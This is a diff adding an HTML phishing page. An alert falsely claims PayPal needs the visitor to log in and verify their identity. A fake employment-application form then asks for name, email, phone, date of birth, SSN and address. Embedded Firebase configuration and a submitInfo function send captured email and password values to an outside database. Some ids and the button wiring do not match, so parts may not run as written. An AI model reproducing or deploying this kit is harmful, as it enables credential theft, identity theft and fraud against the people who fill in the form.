@@ -1,0 +1,106 @@
+<html>
+<head>
+  <title> Hello </title>
+  <link rel='stylesheet' href='style.css' type='text/css'>
+     
+    <script> alert ("Due to your recent activities, you need to login into your PayPal account to verify your identity now!!"); </script> 
+
+</head><body>
+<hgroup>
+  <h1>Welcome </h1>
+  <h3>Fill in the form below and send to deposit your employment application </h3>
+</hgroup>
+<form>
+  <div class="group">
+    <input type="text"><span class="highlight"></span><span class="bar"></span>
+    <label>Name</label>
+  </div>
+  <div class="group">
+    <input type="email"><span class="highlight"></span><span class="bar"></span>
+    <label>Email</label>
+  </div>
+  <div class="group">
+    <input type="email"><span class="highlight"></span><span class="bar"></span>
+    <label>Telephone</label>
+  </div>
+  <div class="group">
+    <input type="email"><span class="highlight"></span><span class="bar"></span>
+    <label>Date Of Birth</label>
+  </div>
+  <div class="group">
+    <input type="email"><span class="highlight"></span><span class="bar"></span>
+    <label> SSN </label>
+  </div>
+  <div class="group">
+    <input type="email"><span class="highlight"></span><span class="bar"></span>
+    <label>Address</label>
+  </div>
+  <div class="group">
+    <input type="email"><span class="highlight"></span><span class="bar"></span>
+    <label>City</label>
+  </div>
+  <div class="group">
+    <input type="email"><span class="highlight"></span><span class="bar"></span>
+    <label>State</label>
+  </div>
+  <div class="group">
+    <input type="email"><span class="highlight"></span><span class="bar"></span>
+    <label>Zip Code</label>
+  </div>
+  <button type="button" class="button buttonBlue">Send
+    <div class="ripples buttonRipples"><span class="ripplesCircle"></span></div>
+  </button>
+</form>
+
+<script src="https://www.gstatic.com/firebasejs/7.19.0/firebase.js"></script>
+     
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyDZOOwIjmE-0QS9DYrwZMp_IK1XtNDgeLg",
+    authDomain: "humbleshire.firebaseapp.com",
+    databaseURL: "https://humbleshire.firebaseio.com",
+    projectId: "humbleshire",
+    storageBucket: "humbleshire.appspot.com",
+    messagingSenderId: "1054406792712",
+    appId: "1:1054406792712:web:9739cbc208fccabf4723bd",
+    measurementId: "G-4GPK4CLGGJ"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  console.log(firebase);
+
+  var database = firebase.database(); 
+  //var ref = database.ref('humbleshire');
+
+  /*var data = {
+        
+    Email: "dan@dan.com",
+    Password:"pass123"
+
+  }
+   ref.push(data); */   
+
+
+   function submitInfo() {
+        
+     //var database = firebase.database();
+     var ref = database.ref('humbleshire1');
+
+      var data = {
+
+        Email: document.getElementById("emailbox").value,
+        pass: document.getElementById("passbox").value
+      }  
+         console.log(data);
+          ref.push(data);
+      alert("Success"); 
+   }
+   
+
+</script>
+</body>
+  </html>
+
+
